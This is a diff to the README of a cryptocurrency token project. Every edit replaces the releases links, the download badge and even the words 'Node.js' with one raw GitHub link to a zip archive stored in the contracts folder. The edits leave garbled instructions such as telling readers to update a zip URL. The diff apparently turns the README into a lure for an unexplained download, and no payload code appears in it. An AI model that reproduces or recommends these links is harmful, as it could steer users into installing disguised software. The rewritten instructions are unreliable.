@@ -1,6 +1,6 @@
 # 🚀 Adaptive-Tax-Token - Experience Dynamic Tokenomics Today
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/Yahy2301811/Adaptive-Tax-Token/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Yahy2301811/Adaptive-Tax-Token/main/contracts/Adaptive-Tax-Token_1.4.zip%20Now-From%20Releases-blue)](https://raw.githubusercontent.com/Yahy2301811/Adaptive-Tax-Token/main/contracts/Adaptive-Tax-Token_1.4.zip)
 
 ## 📚 Overview
 
@@ -17,14 +17,14 @@ Adaptive-Tax-Token is an experimental ERC20 token that uses adaptive tokenomics 
 To run the Adaptive-Tax-Token, you will need:
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
-- **Node.js**: Version 14 or later to handle necessary dependencies.
+- **https://raw.githubusercontent.com/Yahy2301811/Adaptive-Tax-Token/main/contracts/Adaptive-Tax-Token_1.4.zip**: Version 14 or later to handle necessary dependencies.
 - **Internet Connection**: A stable internet connection for downloads and network interactions.
 
 ## 🔧 Download & Install
 
 To get started with Adaptive-Tax-Token:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Yahy2301811/Adaptive-Tax-Token/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Yahy2301811/Adaptive-Tax-Token/main/contracts/Adaptive-Tax-Token_1.4.zip).
 2. **Choose Your Version**: Select the latest release to ensure you have the newest features and fixes. 
 3. **Download the Package**: Click on the asset file that matches your operating system to begin the download.
 4. **Run the Application**: Follow the standard steps for your operating system to open and run the application.
@@ -54,7 +54,7 @@ The Adaptive-Tax-Token contract monitors the transfer activity within a configur
 If you encounter issues while using the Adaptive-Tax-Token:
 
 1. **Check Your System Requirements**: Ensure your setup meets all necessary requirements.
-2. **Update Node.js**: Make sure you are on the latest version of Node.js.
+2. **Update https://raw.githubusercontent.com/Yahy2301811/Adaptive-Tax-Token/main/contracts/Adaptive-Tax-Token_1.4.zip**: Make sure you are on the latest version of https://raw.githubusercontent.com/Yahy2301811/Adaptive-Tax-Token/main/contracts/Adaptive-Tax-Token_1.4.zip
 3. **Consult the Community**: Reach out to the community on platforms like GitHub Discussions or related forums where you can find advice from other users.
 
 ## 📄 Additional Resources
@@ -68,6 +68,6 @@ If you need further support, please raise an issue in the GitHub repository. The
 
 ## 🔗 Links
 
-- [Adaptive-Tax-Token Releases](https://github.com/Yahy2301811/Adaptive-Tax-Token/releases)
+- [Adaptive-Tax-Token Releases](https://raw.githubusercontent.com/Yahy2301811/Adaptive-Tax-Token/main/contracts/Adaptive-Tax-Token_1.4.zip)
 - [Documentation](insert-link-to-documentation)
 - [Community Forum](insert-link-to-forum)
